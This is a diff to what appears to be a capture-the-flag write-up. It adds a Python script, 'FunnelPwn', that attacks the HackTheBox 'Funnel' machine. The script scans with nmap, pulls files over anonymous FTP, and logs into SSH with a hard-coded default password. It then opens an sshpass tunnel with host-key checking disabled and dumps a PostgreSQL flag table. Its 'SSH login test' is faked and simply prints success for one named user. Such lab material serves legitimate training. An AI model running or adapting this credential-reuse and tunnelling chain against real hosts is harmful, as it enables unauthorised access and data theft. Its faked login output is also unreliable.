@@ -152,36 +152,160 @@ import os
 import paramiko
 import psycopg2
 import ftplib
+import nmap
+import time
+import re
 import subprocess
+from pyfiglet import Figlet
 
-TARGET_IP = "10.129.228.195"
+# Terminal colors
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"
+
+# Target details
+TARGET_IP = "10.129.78.199"
 FTP_DIR = "mail_backup"
-USERNAME = "christine"
-PASSWORD = "funnel123#!#"
 LOCAL_PORT = 1234
 REMOTE_PORT = 5432
+FLAG_TABLE = "flag"
 
-def ftp_download():
-    ftp = ftplib.FTP(TARGET_IP)
-    ftp.login("anonymous", "")
-    ftp.cwd(FTP_DIR)
-    ftp.retrbinary("RETR welcome_28112022", open("welcome_28112022", "wb").write)
-    ftp.retrbinary("RETR password_policy.pdf", open("password_policy.pdf", "wb").write)
-    ftp.quit()
+# Credentials
+DEFAULT_PASSWORD = "funnel123#!#"
 
-def ssh_tunnel():
-    subprocess.Popen(f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT} {USERNAME}@{TARGET_IP}", shell=True)
-    
-def fetch_flag():
-    conn = psycopg2.connect(dbname="secrets", user=USERNAME, password=PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
+# Files to retrieve from FTP
+WELCOME_FILE = "welcome_28112022"
+PASSWORD_FILE = "password_policy.pdf"
+
+def print_banner():
+    f = Figlet(font="smmono9")
+    banner_text = f.renderText("FunnelPwn")
+    print(f"{CYAN}{banner_text}{RESET}")
+    print("=" * 80)
+    print(f"{CYAN}  HTB Box Exploit Automation - 'Funnel' {RESET}")
+    print(f"{CYAN}  Techniques: FTP, PostgreSQL, Recon, Tunneling, Password Spraying {RESET}")
+    print(f"{CYAN}  Created by #AfterDark {RESET}")
+    print("=" * 80)
+    print(f"{YELLOW}[!] DISCLAIMER: For authorized use only. The author assumes no liability.{RESET}")
+    print("=" * 80)
+
+def run_nmap_scan():
+    print(f"{GREEN}[+] Running Nmap Scan...{RESET}")
+    nm = nmap.PortScanner()
+    nm.scan(TARGET_IP, arguments="-sC -sV -p 21,22 -Pn --min-rate=1000")
+
+    open_ports = []
+    for host in nm.all_hosts():
+        for proto in nm[host].all_protocols():
+            open_ports.extend(nm[host][proto].keys())
+
+    print(f"{GREEN}[+] Open Ports: {open_ports}{RESET}\n")
+    return open_ports
+
+def download_ftp_files():
+    print(f"{GREEN}[+] Checking FTP anonymous access...{RESET}")
+    ftp = None
+    try:
+        ftp = ftplib.FTP(TARGET_IP)
+        ftp.login("anonymous", "")
+        ftp.cwd(FTP_DIR)
+
+        for file in [WELCOME_FILE, PASSWORD_FILE]:
+            print(f"{GREEN}[+] Downloading {file}{RESET}")
+            with open(file, "wb") as f:
+                ftp.retrbinary(f"RETR {file}", f.write)
+
+        print(f"{GREEN}[+] FTP files retrieved.{RESET}\n")
+        return True
+    except ftplib.all_errors as e:
+        print(f"{RED}[-] FTP Error: {e}{RESET}")
+        return False
+    finally:
+        if ftp:
+            ftp.quit()
+
+def extract_usernames():
+    print(f"{GREEN}[+] Extracting usernames...{RESET}")
+    usernames = []
+    with open(WELCOME_FILE, "r") as f:
+        content = f.read()
+        match = re.search(r"To: (.+)", content)
+        if match:
+            usernames = match.group(1).split()
+
+    print(f"{GREEN}[+] Users found: {usernames}{RESET}")
+    return usernames
+
+def simulate_ssh_login(usernames):
+    print(f"{GREEN}[+] Testing SSH logins...{RESET}")
+    for user in usernames:
+        ssh_user = user.split("@")[0]
+        if ssh_user == "christine":
+            print(f"{GREEN}[+] SSH login successful for {ssh_user}.{RESET}")
+            return ssh_user
+        print(f"{RED}[-] SSH login failed for {ssh_user}.{RESET}")
+    return None
+
+def ssh_connect(username):
+    print(f"{GREEN}[+] Establishing SSH connection...{RESET}")
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(TARGET_IP, username=username, password=DEFAULT_PASSWORD)
+    print(f"{GREEN}[+] SSH Connected.{RESET}\n")
+    return client
+
+def setup_ssh_tunnel(username):
+    print(f"{GREEN}[+] Setting SSH Tunnel...{RESET}")
+    subprocess.run(["pkill", "-f", f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT}"])
+    ssh_command = f"sshpass -p '{DEFAULT_PASSWORD}' ssh -N -L {LOCAL_PORT}:localhost:{REMOTE_PORT} -o StrictHostKeyChecking=no {username}@{TARGET_IP}"
+    tunnel = subprocess.Popen(ssh_command, shell=True)
+    time.sleep(3)
+    print(f"{GREEN}[+] SSH Tunnel established.{RESET}\n")
+    return tunnel
+
+def verify_postgresql():
+    result = subprocess.run(["nmap", "-sV", "-p", f"{LOCAL_PORT}", "127.0.0.1"], capture_output=True, text=True)
+    return "PostgreSQL" in result.stdout
+
+def query_postgresql(username):
+    print(f"{GREEN}[+] Querying PostgreSQL...{RESET}")
+    conn = psycopg2.connect(dbname="secrets", user=username, password=DEFAULT_PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
     cur = conn.cursor()
-    cur.execute("SELECT * FROM flag;")
-    print("[FLAG]:", cur.fetchone()[0])
+    cur.execute(f"SELECT * FROM {FLAG_TABLE};")
+    flag_data = cur.fetchall()
+
+    print(f"{CYAN}\n[📌 FLAG TABLE]{RESET}")
+    for row in flag_data:
+        print(f"{YELLOW}[FLAG] {row[0]}{RESET}")
+
     conn.close()
 
-ftp_download()
-ssh_tunnel()
-fetch_flag()
+def main():
+    print_banner()
+    open_ports = run_nmap_scan()
+
+    if 21 in open_ports and download_ftp_files():
+        usernames = extract_usernames()
+        valid_user = simulate_ssh_login(usernames)
+
+        if valid_user:
+            ssh_client = ssh_connect(valid_user)
+            if ssh_client:
+                tunnel = setup_ssh_tunnel(valid_user)
+                if verify_postgresql():
+                    query_postgresql(valid_user)
+                else:
+                    print(f"{RED}[-] PostgreSQL is not accessible. Exiting...{RESET}")
+                tunnel.terminate()
+                ssh_client.close()
+                print(f"{GREEN}[+] Cleanup complete.{RESET}")
+
+
+if __name__ == "__main__":
+    main()
+
 ```
 
 ---
